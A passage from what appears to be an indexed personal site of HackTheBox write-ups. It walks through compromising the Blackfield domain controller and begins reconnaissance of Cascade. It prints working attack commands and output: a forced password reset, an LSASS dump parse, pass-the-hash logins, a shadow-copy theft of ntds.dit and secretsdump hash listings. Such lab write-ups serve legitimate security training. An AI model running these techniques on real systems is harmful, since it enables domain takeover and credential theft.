 10.129.164.18   445    DC01             C$                              Default share\nSMB         10.129.164.18   445    DC01             forensic                        Forensic / Audit share.\nSMB         10.129.164.18   445    DC01             IPC$            READ            Remote IPC\nSMB         10.129.164.18   445    DC01             NETLOGON        READ            Logon server share \nSMB         10.129.164.18   445    DC01             profiles$       READ            \nSMB         10.129.164.18   445    DC01             SYSVOL          READ            Logon server share \n</code></pre> <p>hm with those creds we can <code>READ</code> 2 more shares that we could previously as Guest, those are <code>NETLOGON</code> and <code>SYSVOL</code>, but by inspecting those shares i found nothing useful!</p>"},{"location":"ch3ckm8_HTB_Blackfield/#ldap-enumeration-as-user-support","title":"LDAP enumeration as user <code>support</code>","text":""},{"location":"ch3ckm8_HTB_Blackfield/#bloodhound-as-support","title":"Bloodhound as support","text":"<p>since we can login to <code>LDAP</code> this means we can use bloodhound <pre><code>bloodhound-python -u 'support' -p '#00^BlackKnight' -d BLACKFIELD.local -ns 10.129.164.18 -c All --zip\n</code></pre></p> <p>start bloodhound and inspect the user we currently have access first (support)</p> <p><code>Group Membership</code> of user <code>support</code>  hm apart from being obviously member of the domain users group, no other group memberships observed</p> <p><code>Outbound Object Control</code> of user <code>support</code>  interesting, our owned user has <code>ForceChangePassword</code> rights towards <code>AUDIT2020</code> user.</p> <p>We could now inspect this user to identify the full path that we will follow</p> <p><code>Group Membership</code> of user <code>AUDIT2020</code>  hm apart from being obviously member of the domain users group, no other group memberships observed</p> <p>Since i found nothing further interesting about <code>AUDIT2020</code> user, i will proceed to run some queries from bloodhound</p> <p><code>Shortest Paths to Unconstrained Delegation Systems</code>  hm this means that user <code>SVC_BACKUP</code> can remotely login to the DC, lets now inspect <code>SVC_BACKUP</code></p> <p><code>Group Membership</code> of user <code>SVC_BACKUP</code>  nothing else found about this user, this user could be our next target, BUT lets stop for a minute and think.</p> <p>Okay the path might not be obvious right now, but lets proceed on doing what we already know, so lets proceed on changing the password for user <code>AUDIT2020</code> as user <code>support</code>.</p>"},{"location":"ch3ckm8_HTB_Blackfield/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_Blackfield/#password-reset-as-user-support-towards-user-audit2020","title":"Password reset as user <code>support</code> towards user <code>AUDIT2020</code>","text":"<p>There are multiple ways to do this, <pre><code>bloodyAD --host '10.129.164.18' -d 'dc01.blackfield.local' -u 'support' -p '#00^BlackKnight' set password AUDIT2020 Thebestpass0!\n</code></pre></p> <pre><code>[+] Password changed successfully!\n</code></pre> <p>OR via rpc <pre><code>rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.129.164.18 -c 'setuserinfo2 audit2020 23 \"Thebestpass0!\"\n</code></pre></p> <p>now the updated creds are: <pre><code>audit2020 \nThebestpass0!\n</code></pre></p> <p>Lets now use my script to bulk check the services to which we can login with those creds:</p> <p>ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</p> <pre><code>./auto_netexec_bulk_creds_checker.sh blackfield.htb 'audit2020' 'Thebestpass0!'\n</code></pre> <pre><code>[*] Checking if winrm port 5985 is open on blackfield.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.164.18   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)\nWINRM       10.129.164.18   5985   DC01             [-] BLACKFIELD.local\\\\audit2020:Thebestpass0!\n\n[*] Checking if smb port 445 is open on blackfield.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.164.18   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)\nSMB         10.129.164.18   445    DC01             [+] BLACKFIELD.local\\\\audit2020:Thebestpass0! \n\n[*] Checking if ldap port 389 is open on blackfield.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.164.18   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)\nLDAP        10.129.164.18   389    DC01             [+] BLACKFIELD.local\\\\audit2020:Thebestpass0! \n\n[*] Checking if rdp port 3389 is open on blackfield.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on blackfield.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.164.18   135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)\nRPC         10.129.164.18   135    DC01             [+] BLACKFIELD.local\\\\audit2020:Thebestpass0! \n\n[*] Checking if nfs port 2049 is open on blackfield.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on blackfield.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on blackfield.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on blackfield.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on blackfield.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> <p>According to the output above, with these creds we can login to <code>SMB</code> , <code>LDAP</code> and <code>RPC</code></p> <p>lets try <code>SMB</code> first</p>"},{"location":"ch3ckm8_HTB_Blackfield/#smb-enumeration-with-creds-as-audit2020","title":"SMB Enumeration with creds as <code>AUDIT2020</code>","text":"<pre><code>nxc smb blackfield.htb  -u 'AUDIT2020' -p 'Thebestpass0!' --shares\n#or\nsmbmap -H blackfield.htb -u 'AUDIT2020' -p 'Thebestpass0!'\n</code></pre> <pre><code>[+] IP: blackfield.htb:445  Name: unknown                                           \n        Disk                                                    Permissions Comment\n    ----                                                    ----------- -------\n    ADMIN$                                              NO ACCESS   Remote Admin\n    C$                                                  NO ACCESS   Default share\n    forensic                                            READ ONLY   Forensic / Audit share.\n    IPC$                                                READ ONLY   Remote IPC\n    NETLOGON                                            READ ONLY   Logon server share \n    profiles$                                           READ ONLY   \n    SYSVOL                                              READ ONLY   Logon server share \n</code></pre> <p>nice! this user seems to have <code>READ</code> permission over the <code>forensic</code> share, to which we did not have such permission previously. Lets connect with smbclient to start exploring the share</p> <pre><code>smbclient //blackfield.htb/forensic -U audit2020%Thebestpass0!\n</code></pre> <pre><code>smb: \\\\&gt; ls\n  .                                   D        0  Sun Feb 23 07:03:16 2020\n  ..                                  D        0  Sun Feb 23 07:03:16 2020\n  commands_output                     D        0  Sun Feb 23 12:14:37 2020\n  memory_analysis                     D        0  Thu May 28 15:28:33 2020\n  tools                               D        0  Sun Feb 23 07:39:08 2020\n\n        5102079 blocks of size 4096. 1687971 blocks available\n</code></pre> <p>lets inspect <code>commands_output</code></p> <pre><code>smb: \\\\&gt; cd commands_output\\\\\nsmb: \\\\commands_output\\\\&gt; ls\n  .                                   D        0  Sun Feb 23 12:14:37 2020\n  ..                                  D        0  Sun Feb 23 12:14:37 2020\n  domain_admins.txt                   A      528  Sun Feb 23 07:00:19 2020\n  domain_groups.txt                   A      962  Sun Feb 23 06:51:52 2020\n  domain_users.txt                    A    16454  Fri Feb 28 16:32:17 2020\n  firewall_rules.txt                  A   518202  Sun Feb 23 06:53:58 2020\n  ipconfig.txt                        A     1782  Sun Feb 23 06:50:28 2020\n  netstat.txt                         A     3842  Sun Feb 23 06:51:01 2020\n  route.txt                           A     3976  Sun Feb 23 06:53:01 2020\n  systeminfo.txt                      A     4550  Sun Feb 23 06:56:59 2020\n  tasklist.txt                        A     9990  Sun Feb 23 06:54:29 2020\n\n        5102079 blocks of size 4096. 1687971 blocks available\n</code></pre>"},{"location":"ch3ckm8_HTB_Blackfield/#file-inspection","title":"File inspection","text":"<p>instead of searching manually, lets download all the shares locally to inspect offline</p> <pre><code>nxc smb blackfield.htb  -u 'AUDIT2020' -p 'Thebestpass0!' -M spider_plus -o DOWNLOAD_FLAG=True\n</code></pre> <p>alright, first lets inspect the <code>commands_output</code> since it has fewer contents</p> <p><code>domain_admins.txt</code></p> <pre><code>Group name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator       Ipwn3dYourCompany     \nThe command completed successfully.\n</code></pre> <p>Very interesting, i dont remember seeing that on bloodhound! lets keep in that in mind and revisit it later</p> <p><code>domain_groups.txt</code> <pre><code>Group Accounts for \\\\\\\\DC01\n\n-------------------------------------------------------------------------------\n*Cloneable Domain Controllers\n*DnsUpdateProxy\n*Domain Admins\n*Domain Computers\n*Domain Controllers\n*Domain Guests\n*Domain Users\n*Enterprise Admins\n*Enterprise Key Admins\n*Enterprise Read-only Domain Controllers\n*Group Policy Creator Owners\n*Key Admins\n*Protected Users\n*Read-only Domain Controllers\n*Schema Admins\nThe command completed successfully.\n</code></pre></p> <p><code>domain_users.txt</code> <pre><code>User accounts for \\\\\\\\DC01\n\n-------------------------------------------------------------------------------\nAdministrator            audit2020                BLACKFIELD103974         \nBLACKFIELD106360         BLACKFIELD107197         BLACKFIELD112766         \n.......    \nBLACKFIELD998321         Guest                    Ipwn3dYouCompany\nkrbtgt                   lydericlefebvre          support                  \nThe command completed successfully.\n</code></pre></p> <p>here we see again this user <code>Ipwn3dYouCompany</code> which i did not find in bloodhound</p> <p>the rest of the txt files provide no useful information.</p> <p>Lets now inspect the <code>memory_analysis</code> folder: <pre><code>  .                                   D        0  Thu May 28 16:28:33 2020\n  ..                                  D        0  Thu May 28 16:28:33 2020\n  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020\n  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020\n  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020\n  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020\n  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020\n  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020\n  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020\n  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020\n  ServerManager.zip                   A 131983313 Thu May 28 16:26:49 2020\n  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020\n  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020\n  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020\n  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020\n  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020\n  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020\n  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020\n\n                7846143 blocks of size 4096. 3490514 blocks available\n</code></pre> very interesting, each one of those is a memory dump file! well without any hesitation, we must first try doing sth with <code>lsass.zip</code> for obvious reasons, lets unzip it first <pre><code>unzip lsass.zip\nArchive:  lsass.zip\n  inflating: lsass.DMP \n</code></pre></p> <p>now check what type of file it is <pre><code>file lsass.DMP\nlsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type\n</code></pre></p> <p>with a little bit of research, i found <code>pypykatz</code> would be usefull to dump this file <pre><code>pypykatz lsa minidump lsass.DMP\nINFO:root:Parsing file lsass.DMP                          \nFILE: ======== lsass.DMP =======                          \n== LogonSession ==\nauthentication_id 406458 (633ba)                    \nsession_id 2\nusername svc_backup                        \ndomainname BLACKFIELD                               \nlogon_server DC01\nlogon_time 2020-02-23T18:00:03.423728+00:00\nsid S-1-5-21-4194615774-2175524697-3563712290-1413  \nluid 406458\n        == MSV ==                          \n                Username: svc_backup                      \n                Domain: BLACKFIELD   \n                LM: NA                              \n                NT: 9658d1d1dcd9250115e2205d9f48400d\n                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c\n        == WDIGEST [633ba]==                              \n                username svc_backup\n                domainname BLACKFIELD\n                password None                             \n        == SSP [633ba]==             \n                username                   \n                domainname\n                password None\n        == Kerberos ==\n                Username: svc_backup                      \n                Domain: BLACKFIELD.LOCAL   \n                Password: None                            \n        == WDIGEST [633ba]==                              \n                username svc_backup\n                domainname BLACKFIELD\n                password None\n\n== LogonSession ==                                  \nauthentication_id 365835 (5950b)\nsession_id 2\nusername UMFD-2\ndomainname Font Driver Host\nlogon_server                                        \nlogon_time 2020-02-23T17:59:38.218491+00:00                                                                                                                                                                                                \nsid S-1-5-96-0-2\n.......\n</code></pre></p> <p>What we see in the output above, is logon sessions, and there is a plaintext hash there for guess who, user <code>SVC_BACKUP</code> ! (if you remember from the bloodhound inspection, our goal was to reach this user)</p>"},{"location":"ch3ckm8_HTB_Blackfield/#logging-in-as-svc_backup-via-pass-the-hash","title":"Logging in as <code>SVC_BACKUP</code> via pass the hash","text":"<p><pre><code>evil-winrm -i blackfield.htb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d\n</code></pre> logged in, and grabbed user flag! <code>3920bb317a0bef51027e2852be64b543</code></p> <p>proof </p>"},{"location":"ch3ckm8_HTB_Blackfield/#privesc","title":"Privesc","text":"<p>Lets remember what bloodhound showed us earlier about user <code>SVC_BACKUP</code>:</p> <p><code>Shortest Paths to Unconstrained Delegation Systems</code>  hm this means that user <code>SVC_BACKUP</code> can remotely login, lets now inspect <code>SVC_BACKUP'</code> group membership:</p> <p><code>Group Membership</code> of user <code>SVC_BACKUP</code>  hm so how do we privesc here? well the simplest thought here to start with, would be that this user is member of <code>BACKUP OPERATORS</code> , what do we know about this group?</p> <p>Members of the Backup Operators group can:</p> <ol> <li>Back up any file or folder, even if they don\u2019t have read access to it.</li> <li>Restore any file or folder, even if they don\u2019t have write access.</li> <li>Log on locally (by default, on workstations and servers).</li> <li>Bypass NTFS permissions using specific APIs or tools (like <code>ntbackup</code>, <code>robocopy</code>, <code>wbadmin</code>, or <code>sebackupprivilege</code>/<code>serestoreprivilege</code>).</li> </ol> <p>Nice, this group seems to have potential for privesc, lets see our user\u2019s privileges:</p> <pre><code>whoami /priv\n</code></pre> <pre><code>PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\nSeShutdownPrivilege           Shut down the system           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n</code></pre>"},{"location":"ch3ckm8_HTB_Blackfield/#abusing-backup-operators-privileges","title":"Abusing <code>BACKUP OPERATORS</code> privileges","text":"<p>So searching for resources about abusing <code>BACKUP OPERATORS</code> i found this: https://www.hackingarticles.in/addself-active-directory-abuse/</p> <p>And according to it, i run the following commands as described there: <pre><code># on your machine:\n$ cat raj.dsh \nset context persistent nowriters\nadd volume c: alias raj\ncreate\nexpose %raj% z:\n\n$ unix2dos raj.dsh\nunix2dos: converting file raj.dsh to DOS format...\n</code></pre></p> <pre><code>*Evil-WinRM* PS C:\\\\&gt; mkdir Temp\n    Directory: C:\\\\\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         8/5/2025   9:27 PM                Temp\n*Evil-WinRM* PS C:\\\\&gt; cd Temp\n*Evil-WinRM* PS C:\\\\Temp&gt; upload raj.dsh\n\nInfo: Uploading /home/ch3ckm8/raj.dsh to C:\\\\Temp\\\\raj.dsh\n\nData: 112 bytes of 112 bytes copied\n\nInfo: Upload successful!\n*Evil-WinRM* PS C:\\\\Temp&gt; diskshadow /s raj.dsh\nMicrosoft DiskShadow version 1.0\nCopyright (C) 2013 Microsoft Corporation\nOn computer:  DC01,  8/5/2025 9:28:35 PM\n\n-&gt; set context persistent nowriters\n-&gt; add volume c: alias raj\n-&gt; create\nAlias raj for shadow ID {92e80450-422d-42ac-9db0-1d6e2c594fd2} set as environment variable.\nAlias VSS_SHADOW_SET for shadow set ID {db98334c-1c71-4a02-b8bf-564a028e6afe} set as environment variable.\n\nQuerying all shadow copies with the shadow copy set ID {db98334c-1c71-4a02-b8bf-564a028e6afe}\n\n    * Shadow copy ID = {92e80450-422d-42ac-9db0-1d6e2c594fd2}       %raj%\n        - Shadow copy set: {db98334c-1c71-4a02-b8bf-564a028e6afe}   %VSS_SHADOW_SET%\n        - Original count of shadow copies = 1\n        - Original volume name: \\\\\\\\?\\\\Volume{6cd5140b-0000-0000-0000-602200000000}\\\\ [C:\\\\]\n        - Creation time: 8/5/2025 9:28:36 PM\n        - Shadow copy device name: \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\n        - Originating machine: DC01.BLACKFIELD.local\n        - Service machine: DC01.BLACKFIELD.local\n        - Not exposed\n        - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}\n        - Attributes:  No_Auto_Release Persistent No_Writers Differential\n\nNumber of shadow copies listed: 1\n-&gt; expose %raj% z:\n-&gt; %raj% = {92e80450-422d-42ac-9db0-1d6e2c594fd2}\nThe shadow copy was successfully exposed as z:\\\\.\n-&gt;\n*Evil-WinRM* PS C:\\\\Temp&gt; robocopy /b z:windowsntds . ntds.dit\n\n-------------------------------------------------------------------------------\n   ROBOCOPY     ::     Robust File Copy for Windows\n-------------------------------------------------------------------------------\n\n  Started : Tuesday, August 5, 2025 9:28:44 PM\n   Source : Z:\\\\windowsntds\\\\\n     Dest : C:\\\\Temp\\\\\n\n    Files : ntds.dit\n\n  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30\n\n------------------------------------------------------------------------------\n\n2025/08/05 21:28:44 ERROR 2 (0x00000002) Accessing Source Directory Z:\\\\windowsntds\\\\\nThe system cannot find the file specified.\n\n*Evil-WinRM* PS C:\\\\Temp&gt; robocopy /b z:\\\\windows\\\\ntds . ntds.dit\n\n-------------------------------------------------------------------------------\n   ROBOCOPY     ::     Robust File Copy for Windows\n-------------------------------------------------------------------------------\n\n  Started : Tuesday, August 5, 2025 9:29:30 PM\n   Source : z:\\\\windows\\\\ntds\\\\\n     Dest : C:\\\\Temp\\\\\n\n    Files : ntds.dit\n\n  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30\n\n------------------------------------------------------------------------------\n\n                       1    z:\\\\windows\\\\ntds\\\\\n        New File          18.0 m    ntds.dit\n0.0%\n0.3%\n...\n99.6%\n100%\n100%\n\n------------------------------------------------------------------------------\n\n               Total    Copied   Skipped  Mismatch    FAILED    Extras\n    Dirs :         1         0         1         0         0         0\n   Files :         1         1         0         0         0         0\n   Bytes :   18.00 m   18.00 m         0         0         0         0\n   Times :   0:00:00   0:00:00                       0:00:00   0:00:00\n\n   Speed :           121770116 Bytes/sec.\n   Speed :            6967.741 MegaBytes/min.\n   Ended : Tuesday, August 5, 2025 9:29:31 PM\n\n*Evil-WinRM* PS C:\\\\Temp&gt; reg save hklmsystem c:Tempsystem\nreg.exe : ERROR: Invalid key name.\n    + CategoryInfo          : NotSpecified: (ERROR: Invalid key name.:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\nType \"REG SAVE /?\" for usage.\n*Evil-WinRM* PS C:\\\\Temp&gt; reg save hklm\\\\system c:\\\\Temp\\\\system\nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\\\Temp&gt; download ntds.dit\n\nInfo: Downloading C:\\\\Temp\\\\ntds.dit to ntds.dit\n\nInfo: Download successful!\n*Evil-WinRM* PS C:\\\\Temp&gt; download system\n\nInfo: Downloading C:\\\\Temp\\\\system to system\n\nInfo: Download successful!\n*Evil-WinRM* PS C:\\\\Temp&gt; \n</code></pre>"},{"location":"ch3ckm8_HTB_Blackfield/#dumping-ntds-using-the-system-hive","title":"Dumping NTDS using the SYSTEM hive","text":"<p>Finally, run secretsdump to extract NTLM password hashes and other credential data from an offline copy of the AD database (<code>ntds.dit</code>), using the Boot Key from the <code>SYSTEM</code> hive. <pre><code>impacket-secretsdump -ntds ntds.dit -system system local\n</code></pre></p> <p><pre><code>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393\n[*] Dumping Domain Credentials (domain\\\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c\n[*] Reading and decrypting hashes from ntds.dit \nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDC01$:1000:aad3b435b51404eeaad3b435b51404ee:077e90a55810c6b13c6ff0983cb831ef:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::\naudit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::\nsupport:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::\nBLACKFIELD.local\\\\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::\nBLACKFIELD.local\\\\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::\n.....\n</code></pre> Almost done now, grab the 2nd part of admin\u2019s hash <code>184fb5e5178480be64824d4cd53b99ee</code> and login via winrm.</p>"},{"location":"ch3ckm8_HTB_Blackfield/#logging-in-as-administrator-via-pass-the-hash","title":"Logging in as Administrator via pass the hash","text":"<p><pre><code>evil-winrm -i blackfield.htb -u Administrator -H 184fb5e5178480be64824d4cd53b99ee \n</code></pre> grabbed root flag! <code>4375a629c7c67c8e29db269060c955cb</code></p> <p>proof </p>"},{"location":"ch3ckm8_HTB_Blackfield/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_Blackfield/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap scan -&gt; target is a DC, chose smb , rpc and ldap services to focus on</li> <li>enumerate <code>LDAP</code> -&gt; nothing useful</li> <li>enumerate <code>RPC</code> -&gt; nothing useful</li> <li>enumerate <code>SMB</code> shares -&gt; found access to share</li> <li>retrieved usernames from files contained in that share</li> <li><code>AS-REP roasting</code> was conducted and successfully got AS-REP hash (since the user has The <code>Do not require Kerberos preauthentication</code> flag enabled (since we had a list of usernames on the recon phase)</li> <li><code>cracked</code> the retrieved hash for a user (support)</li> <li><code>correlated</code> the found creds with the <code>RPC</code> ,<code>SMB</code>,<code>LDAP</code> services</li> <li>enumerated <code>RPC</code> as user support, found users, groups</li> <li>enumerated <code>SMB</code> as user support, no non default shares found</li> <li>enumerated <code>LDAP</code> as user support via <code>Bloodhound</code> , found attack path, the compromised user (support) can change pass for another user (audit2020)</li> </ol>"},{"location":"ch3ckm8_HTB_Blackfield/#foothold_1","title":"Foothold","text":"<ol> <li><code>changed password</code> for user audit2020 as user support</li> <li><code>correlated</code> this user's  creds with the <code>RPC</code> ,<code>SMB</code>,<code>LDA</code> services</li> <li>enumerated <code>SMB</code> as user audit2020, found shares</li> <li>the found <code>shares</code> contained critical files, that were <code>memory dumps</code></li> <li>chose the <code>lsass dump</code> and dumped it, revealing a NTLM hash for another user <code>svc_backup</code></li> <li>logged in via win-rm via pass the hash as user <code>svc_backup</code></li> <li>enumerated <code>LDAP</code> as user audit2020 via <code>Bloodhound</code> , found attack path, the compromised user (support) can change pass for another user (audit2020)</li> <li>logged in via evil-winrm to host using on user svc-alfresco, and grabbed the user flag.</li> </ol>"},{"location":"ch3ckm8_HTB_Blackfield/#privesc_1","title":"Privesc","text":"<ol> <li>now that we got foothold, as a user (svc-backup) i inspected its <code>group membership</code>, which i found that was member of a privileged: group <code>BACKUP operators</code>, which after investigation was found that it has permissions to backup files</li> <li>found commands that exploit those privileged group's permissions to retrieve <code>NTDS.dit</code> and <code>SYSTEM hive</code> and download them offline</li> <li>now these 2 files are available offline, i dumped them using secretsdump which revealed the <code>NTLM hash</code> of the <code>Administrator</code></li> <li>using administrator's NTLM hash we login via evil-winrm and grab the root flag!</li> </ol>"},{"location":"ch3ckm8_HTB_Blackfield/#sidenotes","title":"Sidenotes","text":"<p>To conclude, this was a good all around machine. What i learned from this one, for the foothold was that enumeration can have multiple layers, as more users get compromised. As for the privesc part, it was essential to learn about the privileged group's permissions that the compromised user was a member of  and how to exploit them. </p> <p></p>"},{"location":"ch3ckm8_HTB_Cascade/","title":"Cascade","text":""},{"location":"ch3ckm8_HTB_Cascade/#intro","title":"Intro","text":"<p>[[windows]] [[NotAssumedBreach]] [[codereview]] [[RecycleBin]] [[OSCPpath]]</p> <p>Tags: #windows #NotAssumedBreach #codereview #RecycleBin #OSCPpath  Tools used: enum4linux (enumerating smb) ldapsearch (ldap enumeration) netexec (inspecting access to services for given creds) jetbrains DotPeek (debugging the .net app)</p>"},{"location":"ch3ckm8_HTB_Cascade/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_HTB_Cascade/#add-machine-to-etchosts","title":"Add machine to <code>/etc/hosts</code>","text":"<pre><code>echo '10.10.10.182 cascade.htb' | sudo tee -a /etc/hosts\n</code></pre>"},{"location":"ch3ckm8_HTB_Cascade/#nmap-scan","title":"Nmap scan","text":"<pre><code>sudo nmap -sC -sV cascade.htb\n</code></pre> <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-02 01:22 EDT\nNmap scan report for cascade.htb (10.10.10.182)\nHost is up (0.048s latency).\nNot shown: 985 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-02 05:22:52Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n49165/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-07-02T05:23:44\n|_  start_date: 2025-07-02T05:21:04\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 100.34 seconds\n</code></pre>"},{"location":"ch3ckm8_HTB_Cascade/#rpc-enumeration-port-135","title":"RPC enumeration (port 135)","text":""},{"location":"ch3ckm8_HTB_Cascade/#anonymous-login","title":"Anonymous login:","text":"<pre><code>rpcclient -U \"\" -N cascade.htb\n</code></pre> <p>lets enumerate domains <pre><code>enumdomains\n</code></pre></p> <pre><code>rpcclient $&gt; enumdomains\nname:[CASCADE] idx:[0x0]\nname:[Builtin] idx:[0x0]\n</code></pre> <p>lets enumerate the domain users <pre><code>enumdomusers\n</code></pre></p> <pre><code>rpcclient $&gt; enumdomusers\nuser:[CascGuest] rid:[0x1f5]\nuser:[arksvc] rid:[0x452]\nuser:[s.smith] rid:[0x453]\nuser:[r.thompson] rid:[0x455]\nuser:[util] rid:[0x457]\nuser:[j.wakefield] rid:[0x45c]\nuser:[s.hickson] rid:[0x461]\nuser:[j.goodhand] rid:[0x462]\nuser:[a.turnbull] rid:[0x464]\nuser:[e.crowe] rid:[0x467]\nuser:[b.hanson] rid:[0x468]\nuser:[d.burman] rid:[0x469]\nuser:[BackupSvc] rid:[0x46a]\nuser:[j.allen] rid:[0x46e]\nuser:[i.croft] rid:[0x46f]\n</code></pre> <p>lets enumerate the domain groups <pre><code>enumdomgroups\n</code></pre></p> <p><pre><code>rpcclient $&gt; enumdomgroups\ngroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\ngroup:[Domain Computers] rid:[0x203]\ngroup:[Group Policy Creator Owners] rid:[0x208]\ngroup:[DnsUpdateProxy] rid:[0x44f]\n</code></pre> hm, the interesting group here might be Group Policy Creator Owners, lets try SMB.</p>"},{"location":"ch3ckm8_HTB_Cascade/#smb-enumeration-port-139445","title":"SMB enumeration (port 139/445)","text":""},{"location":"ch3ckm8_HTB_Cascade/#enum4linux","title":"enum4linux","text":"<p>we can find more info via rpc, automatically via <code>enum4linux</code>: <pre><code> enum4linux -a 10.10.10.182\n</code></pre> for example <pre><code>[+] Password Info for Domain: CASCADE\n        [+] Minimum password length: 5\n        [+] Password history length: None\n        [+] Maximum password age: Not Set\n        [+] Password Complexity Flags: 000000\n                [+] Domain Refuse Password Change: 0\n                [+] Domain Password Store Cleartext: 0\n                [+] Domain Password Lockout Admins: 0\n                [+] Domain Password No Clear Change: 0\n                [+] Domain Password No Anon Change: 0\n                [+] Domain Password Complex: 0\n        [+] Minimum password age: None\n        [+] Reset Account Lockout Counter: 30 minutes \n        [+] Locked Account Duration: 30 minutes \n        